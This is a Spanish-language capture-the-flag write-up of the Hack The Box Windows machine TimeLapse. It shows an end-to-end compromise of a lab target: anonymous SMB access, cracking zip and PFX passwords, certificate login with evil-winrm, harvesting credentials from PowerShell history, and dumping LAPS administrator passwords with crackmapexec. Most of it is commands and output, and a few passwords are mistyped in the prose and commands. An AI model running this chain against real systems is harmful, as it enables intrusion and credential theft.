---
title: WriteUp TimeLapse HTB
author: rabb1t
date: 2022-08-20
categories: [HackTheBox, WriteUp, Machines, Windows]
tags: [pfx2john, zip2john, john, LAPS, PFX, crackmapexec, evil-winrm, smbclient, OpenSSL]
math: false
mermaid: false
image:
  path: https://www.hackthebox.com/storage/avatars/bae443f73a706fc8eebc6fb740128295.png
  width: 180
  height: 180
---
## Índice
- [Información básica de la máquina](#máquina-timelapse)
- [Herramientas y recursos empleados](#herramientas-y-recursos-empleados)
- [Enumeración](#enumeración)
	- [SMB](#smb)
- [Crackeando contraseñas](#crackeando-contraseñas)
- [Obteniendo acceso como legacyy](#obteniendo-acceso-como-legacyy)
- [Obteniendo credenciales mediante LAPS](#obteniendo-credenciales-mediante-laps)
- [Obteniendo sesión como Administrator](#obteniendo-sesión-como-administrator)

## Máquina TimeLapse

| IP     	   |10.10.11.152|
|--------------|------------|
| OS		   | Windows	|
| Dificultad   | Fácil      |
| Creador	   | ctrlzero	|

## Herramientas y recursos empleados
- Herramientas
	- Obtención de información:
		- nmap
		- smbclient
	- Comprimir y descomprimir:
		- 7z
		- unzip
	- Crackeadores y generadores de hashes:
		- zip2john
		- pfx2john
		- john
		- crackpkc12
	- Otros:
		- openssl
		- evil-winrm
		- crackmapexec

## Enumeración
Iniciemos con un escaneo de todos los puertos abiertos y la detección de servicios para los mismos:
```shell
rabb1t@hold:~$ nmap -p- -sCV --open -sS --min-rate 5000 -n -Pn -vvv -oN scope.txt 10.10.11.152
Nmap scan report for 10.10.11.152
Host is up, received user-set (0.39s latency).
Not shown: 65527 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE           REASON          VERSION
53/tcp    open  domain            syn-ack ttl 127 Simple DNS Plus
135/tcp   open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  tcpwrapped        syn-ack ttl 127
445/tcp   open  tcpwrapped        syn-ack ttl 127
593/tcp   open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  tcpwrapped        syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl? syn-ack ttl 127
57854/tcp open  tcpwrapped        syn-ack ttl 127
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h00m00s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-08-19T04:32:07
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 64147/tcp): CLEAN (Timeout)
|   Check 2 (port 32357/tcp): CLEAN (Timeout)
|   Check 3 (port 16288/udp): CLEAN (Timeout)
|   Check 4 (port 22941/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/
```

### SMB
Vemos el puerto empleado para SMB (Server Message Block) el cual es 445. Podemos intentar conectarnos para ver si hay recursos compartidos que nos pueda servir para comenzar:
```shell
rabb1t@hold:~$ smbclient --no-pass -L //10.10.11.152   
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Shares          Disk      
	SYSVOL          Disk      Logon server share 
```

Hay un recurso compartido que llama mucho la atención, `Shares`. Veamos qué nos encontramos ahí y qué nos puede servir: 
```shell
rabb1t@hold:~$ smbclient --no-pass //10.10.11.152/Shares   
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 15:39:15 2021
  ..                                  D        0  Mon Oct 25 15:39:15 2021
  Dev                                 D        0  Mon Oct 25 19:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 15:48:42 2021

		6367231 blocks of size 4096. 2455284 blocks available
smb: \> cd Dev
smb: \Dev\> ls
  .                                   D        0  Mon Oct 25 19:40:06 2021
  ..                                  D        0  Mon Oct 25 19:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 15:46:42 2021

		6367231 blocks of size 4096. 2455284 blocks available
smb: \Dev\> cd ..
smb: \> cd HelpDesk
smb: \HelpDesk\> ls
  .                                   D        0  Mon Oct 25 15:48:42 2021
  ..                                  D        0  Mon Oct 25 15:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 14:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 14:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 14:57:40 2021
  LAPS_TechnicalSpecification.docx    A    72683  Mon Oct 25 14:57:44 2021

		6367231 blocks of size 4096. 2455284 blocks available
smb: \HelpDesk\> cd ../Dev
smb: \Dev\> get winrm_backup.zip 
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (2,0 KiloBytes/sec) (average 2,0 KiloBytes/sec)
smb: \Dev\> 
```

En el directorio `Dev` tenemos un backup, se ve jugoso de primeras porque puede tener contraseñas o información importante.
En el directorio `HelpDesk` encontramos diversos documentos que de momento no veremos.
Al final descargamos el archivo `winrm_backup.zip` a nuestra máquina con el comando `get`. Al salir de la sesión de smb, con `7z` listamos los archivos que tiene el comprimido:
```shell
rabb1t@hold:~$ 7z l winrm_backup.zip

7-Zip [64] 17.04 : Copyright (c) 1999-2021 Igor Pavlov : 2017-08-28
p7zip Version 17.04 (locale=es_CO.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs x64)

Scanning the drive for archives:
1 file, 2611 bytes (3 KiB)

Listing archive: winrm_backup.zip

--
Path = winrm_backup.zip
Type = zip
Physical Size = 2611

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2021-10-25 14:21:20 .....         2555         2405  legacyy_dev_auth.pfx
------------------- ----- ------------ ------------  ------------------------
2021-10-25 14:21:20               2555         2405  1 files
```

Intentamos descomprimirlo con _unzip_ pero nos pide contraseña:
```shell
rabb1t@hold:~$ unzip winrm_backup.zip 
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password:
```

## Crackeando contraseñas
Con `zip2john` podemos crear un hash equivalente al archivo y guardarlo, para posteriormente crackearlo con `JtR` (John the Ripper) y obtener la contraseña (en caso de que se encuentre en el diccionario):

```shell
rabb1t@hold:~$ zip2john winrm_backup.zip > hash_winrm_backup
winrm_backup.zip/legacyy_dev_auth.pfx:$pkzip2$1*2*2*0*965*9fb*12ec5683*0*4e*8*965*12ec*72aa*1a84b40ec6b5c20abd7d695aa16d8c88a3cec7243acf179b842f2d96414d306fd67f0bb6abd97366b7aaea736a0cda557a1d82727976b2243d1d9a4032d625b7e40325220b35bae73a3d11f4e82a408cb00986825f936ce33ac06419899194de4b54c9258cd7a4a7f03ab181b611a63bc9c26305fa1cbe6855e8f9e80c058a723c396d400b707c558460db8ed6247c7a727d24cd0c7e93fbcbe8a476f4c0e57db890a78a5f61d1ec1c9a7b28b98a81ba94a7b3a600498745859445ddaef51a982ae22577a385700fdf73c99993695b8ffce0ef90633e3d18bf17b357df58ea7f3d79f22a790606b69aed500db976ae87081c68d60aca373ad25ddc69bc27ddd3986f4d9ce77c4e49777c67a0740d2b4bbca38b4c2b3ee329ac7cf30e5af07f13d860a072784e753a999f3dd0d2c3bbb2269eeffe2f0b741441538e429cb9e8beee2999557332ac447393db6ed35856bd7fcae85329b99b21449f3bb63c9fb74870dbf76e7dc76859392bf913da2864555b6ed2a384a2ae8a6c462e5115adbf385f073cfc64ec7a4646386cf72b5529bbf48af050640f26c26e337add96b61aee56d3d92de09f25c40efe56d4c2b853ce29de32c05634afc4dc9ca8df991b73e10db5bb9cd3fc807bfe05bb789a4b4a525001d253ca6f67abc928ebe7777a0b2d06d7fd2d61123c7e6b8050fe51994f116bc9e694cbdd6e81bfe71672582e7329cb78e20793b970407ea0bb8787c93875be25432987b2fb385c08e1970e5f8868db466476ef41b157eaf4d9a69508d57166213d81f1f981cffd5a6d2053a65c380ad98f10eb2b94104cd41104c59e6f4d782868f38ae64c7b0c29fb0e05d18429c26dc3f5a9c4ec9328b0aff3a41679f9f12e9b4e2cc9dfca5a67c021a093549863923422ada4ccf082924ef1ec4ec38847bf2bffb893f14abecdad3c83a31e276a23542ff08cdc7d7ec6576dbda1edf1326174b13c7f078d6ea4dc90a743cdf6aa076a17250ac2fff6de8113ffc58dd4ccda187b6c7890264f0d0ff113aa3fa15b8515d0857f8110b99fa2915f0476a08b107965fa5e74c05018db0d9a8ecc893780027b58225e091b50aa07684f1990508275d87fd7a8f28193ca41d9ce649e3de4885913b15f318e7459c443849a248463bbfe949def6d9ca95e6ace6613eabf758c6399639f1f7779fc9aeee32d518a0db9a046340e002445b8ae9a5cb630a194a490d326247f3582680814dfed79496475e4a06f11d4433b13ed3c3803e3c1da5335cd7919453ce0a6b62116c0ffa0fc7c4bba77bbba080092541697c3200edc7e9aa001a01fc0063b27159384538ecb7cddab32a6feca01853ac712a0e21a436d647d1c94bd0a5b40510cb080d4ce79a2e49fc82fd961106b7b73d2e24603711300ddc711b8cc284cc284777d230ebcc140ab0296676f465da1afeb40fe2f4f9636238c09a9716a1f3071fd2653b9956c9180270b1582074175570d5784af0d22460e6d28153f146d01ff0f2388894b0541a9df950e1515a2397360e09c6dfd92feaf068f560be034bcf26cabc76be09a94254bbbf88f4ee85241c12be370ca32cc5391e33f05a2e7a75afe7876a893fdc9fded2ea1ac701001cf0d34eaba84dd4815a28dc4cfe6c3abc35a057f6b95dd4fdb07a99edc0a020273f5eb9b2d2e6686deda3c1c9c5deb85b9192d68a841cd9a7aa448ddd66e0a839d81f0106a8a1e38f6da99a3b973a0598aca2ba36cf9ef0b4a9da6ae327069a88677b7e5303a08cea1a37f2623d98233672e425693e16ade5b16d49669e2002aec50aedeccc21af37901d278bd3a5b7618b9f0332a4848a29e9e3eccef234cf2392d46c33be6c3c75e57f6c19998febadf2c6a3e22a6e4276e6863f8d16ecec1f4eca9495a031e5f7426bf90a9831b9901588e72330fc42fe3ed7a09d7404a14727b7b876786b35873cf24deb921662c458d05b8c8872d88e8889407024e46d06d8f3cf9a1d144deb91acf2273c13600bc2bbc9c1405269c3eff0042d0533c95f45c28ed2b8854fbbda941b1957d27122d8a6afe09261f206ccde7e7c4f69c8d46d4e101849c02c9eecc65e365ebf48e3ce836385dcfd824e085b0104b1210b5acfedb3df857cdc2ad9976660dfb20b228ce127c4cdc5bb9d89f65822ebd728b2d1dbce2872e9fa113c19ed251e7c103022b5029b63e35bcd0ef75bf13f1bb56499f1505b6eef27aa6fd079f4d4156c566a76d8b6bcdd518cdd6ea3de2048f9b059e338946fa2549ab27646ba9bfe08580df4582be056dcc68232efef533ea90c9c8d613e22fd4f2d75c6a89e4643ff3717a21dc0624a1c844549fc9700d137865b018eef82803ec1b3f19f9e3f25c276062effb0829c00825677d21530b14a8ee27c6507ff31549430f66488f4ef996cf784f37bbf103e49f17bef1ae41e02dce2a3715127942fcaec5da410f04174664b7eb0788e83920ad9afa223a5a4791bb28b3d5e75933edfd7535aaeb984f8dc1c5e3880411c733f775c93b620f14662c1594c909eceb7c8c25807b9e49771847a567d6fd63c607c6ebf71714a869cd4eb7956995cb7011c7973c705ee13aeabc319ff6f71569c9c46821cda0db6555dde9939f27f68d1b6dfcfb53b0ed1c9f35c7d29e550437ab80da87384614f9508dbb49f8be5a85c1bfebe13067aff3fd745009db52a4de15761f67ad2a3bf89440d134ed7c6c96c41340c6947785b75698e6b61a0d2da6ffe4290a15a932d42d5e2c4928a92121b0cb3c11a7bbb5fa5a70e31f7bd24e892466e767c4193f5902eb4fc22d1b9c9e7dc8f27886ca3a37dbd842a9fb445adaa738cddbc4e0b62c14b49dc807843db29df781a65491ae52dc16b5d5dc2193f965a595cd72c5b6f1e63e1b4b521e9d891b481fef699fb2ccb853df7b8a902910b229db859d293628baf30891c255fa46d337336fb0b4a47986939372f13f4315c38af852e9a8893fe275be0e5b095c1219edc026c71236ff3a314084383ad0228f26b7935f454c8d3d59306a2c7eb7f9220a67e8c1a2f508760f3ccdb52399e81bcb7e5347c1083ecbdb1c009338e017721b4324a40329a5938ab4ee99d087a2edb62d687fcebeda2211760b2287ff574ebc66e076132cab4cb15e1e551acf11f3ed87970aee89159421facc8eb82bca90a36c43f75df5bececfde3128e2834c5ecd067e61c9ba954cc54fc291a1458bdfe9f49fba35eb944625a528fb9d474aaa761314740997e4d2ed3b1cb8e86744cfb6c9d5e3d758684ff3d9fdc1ba45b39141625d4e6ba38cd3300507555935db1193b765d226c463481388a73d5361e57b7b40c7d3df38fc5da2c1a255ff8c9e344761a397d2c2d59d722723d27140c6830563ee783156404a17e2f7b7e506452f76*$/pkzip2$:legacyy_dev_auth.pfx:winrm_backup.zip::winrm_backup.zip
```

Ya tenemos el `hash`. Es momento de crackearlo con `John the Ripper`, para ello empleamos el diccionario `rockyou.txt` que tiene alrededor de 14 millones de posibles contraseñas:
```shell
rabb1t@hold:~$ john --wordlist=/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt hash            
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press "q" or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
surfrox1391..supervier
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Obetenemos la contraseña `sumpremelegacy`; por lo que, ahora podemos descomprimir el archivo `winrm_backup.zip`:
```shell
rabb1t@hold:~$ unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx   
```

Ya que es un archivo con extensión `pfx`, podemos hacer una búsqueda rápida en internet del [para qué sirve](https://www.reviversoft.com/es/file-extensions/pfx). Como dice en el artículo:

> ...incluyen certificados digitales utilizados para procesos de autenticación necesarias para determinar si un usuario o un dispositivo puede acceder a ciertos archivos.

Podemos intentar conectarnos a la máquina víctima pero para ello necesitamos primero extraer el `certificado` y la `llave` del archivo `pfx` como se muestra [aquí](https://red-orbita.com/?p=8235). Al intentar hacerlo, nos pide la contraseña del archivo; por lo que, nuevamente tendremos que obtener una contraseña.

Para variar no usaremos `John the Ripper`, una alternativa sería [crackpkcs12](https://github.com/crackpkcs12/crackpkcs12):
```shell
rabb1t@hold:~$ crackpkcs12 -d /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt -v -t 10 legacyy_dev_auth.pfx 

Dictionary attack - Starting 10 threads

Performance:              3230962 passwords [    2005 passwords per second]
*********************************************************
Dictionary attack - Thread 1 - Password found: thuglegacy
*********************************************************
```

- -d: Directory/Directorio de contraseñas.
- -v: Verbose mode/Modo verbose.
- -t: Threads/Hilos.

> Para obtener el hash equivalente y posteriormente crackearlo con `John the Ripper` usaríamos `pfx2john`, de igual forma a como hicimos con [_zip2john_](#crackeando-contraseñas).
{: .prompt-info}

Obtenemos la contraseña `thuglegacy`. Ahora sí podemos crear el certificado y la llave (ingresando la contraseña obtenida) que nos permita conectarnos a la máquina víctima: 
```shell
rabb1t@hold:~$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out certificate  
Enter Import Password:
rabb1t@hold:~$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key       
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
```

> Para el `PEM pass phrase` y la verificación puse "rabb1t".
{: .prompt-warning}

## Obteniendo acceso como legacyy

Ahora podemos conectarnos con `evil-winrm` via SSL.
```shell
rabb1t@hold:~$ evil-winrm -S -c certificate -k key -i 10.10.11.152

Evil-WinRM shell v3.4

Warning: SSL enabled

Info: Establishing connection to remote endpoint

Enter PEM pass phrase:
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
```

Antes de ejecutar `winpeas`, podemos hacer una enumeración manual siguiendo los pasos de _escalada de privilegios de [hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)_, en el cual uno de los pasos es revisar el historial de powershell. Llegado a este punto, podemos hacer y ver lo siguiente:
```shell
*Evil-WinRM* PS C:\\Users> cd $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine
*Evil-WinRM* PS C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine> ls


    Directory: C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/3/2022  11:46 PM            434 ConsoleHost_history.txt

*Evil-WinRM* PS C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine> type ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

Vemos que hay variables declaradas y que está ejecutando código `-scriptblock` en el puerto `5986` empleando SSL `-usessl` con las credenciales que están en la variable `$c`.

Podemos recrear este escenario configurando las mismas variables:
```shell
*Evil-WinRM* PS C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine> $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
*Evil-WinRM* PS C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine> $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
*Evil-WinRM* PS C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine> $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
*Evil-WinRM* PS C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
timelapse\svc_deploy
```
> También podemos conectarnos a través de `evil-winrm` proporcionando la contraseña vía SSL
{: .prompt-info}

¡Estamos ejecutando comandos como el usuario `svc_deploy`! Ahora vamos a enumerar este usuario para ver de qué nos podemos aprovechar:

## Obteniendo credenciales mediante LAPS
```shell
*Evil-WinRM* PS C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine>  invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {net user svc_deploy}
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User\'s comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   4/18/2022 9:12:42 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```
> —Es aquí cuando he caído en cuenta que el nombre de la máquina es una pista a LAPS :P—
{: .prompt-info}

Entre el reconocimiento básico encontramos que el usuario `svc_deploy` hace parte del grupo `LAPS_Readers`. Haciendo una búsqueda por nuestro navegador favorito encontramos un [artículo](https://www.hackingarticles.in/credential-dumpinglaps/) sobre diferentes formas de obtener las contraseñas abusando de `LAPS`.

En nuestro caso obtendremos las credenciales usando `crackmapexec` —puedes usar cualquier otro método empleado en el artículo—.


## Obteniendo sesión como Administrator
Empleando `crackmapexec` podemos usar el módulo `laps` para obtener las contraseñas;
```shell
rabb1t@hold:~$ crackmapexec ldap 10.10.11.152 -u svc_deploy -p 'E3R^12p7PLlC%KWaxuaV' --kdcHost 'timelapse.htb' -M laps
SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.152    389    DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV 
LAPS        10.10.11.152    389    DC01             [*] Getting LAPS Passwords
LAPS        10.10.11.152    389    DC01             Computer: DC01$                Password: 6jdi\#U8Ju}8Eq&Gmw,yF\#}iH
```

> Para usar el argumento `--kdcHost` debimos anteriormente haber agregado el dominio al archivo `/etc/host` apuntando a la dirección IP de la máquina víctima.
{: .prompt-warning}

Nos conectamos con `evil-winrm` vía SSL (`-S`) como administrador.
```shell
rabb1t@hold:~$ evil-winrm -S -i 10.10.11.152 -p "6jdi#U8Ju}8Eq&Gmw,yF#}iH" -u "administrator"

Evil-WinRM shell v3.4

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoami
timelapse\\Administrator
*Evil-WinRM* PS C:\\Users\\Administrator\\Documents>
```

¡Happy Hacking!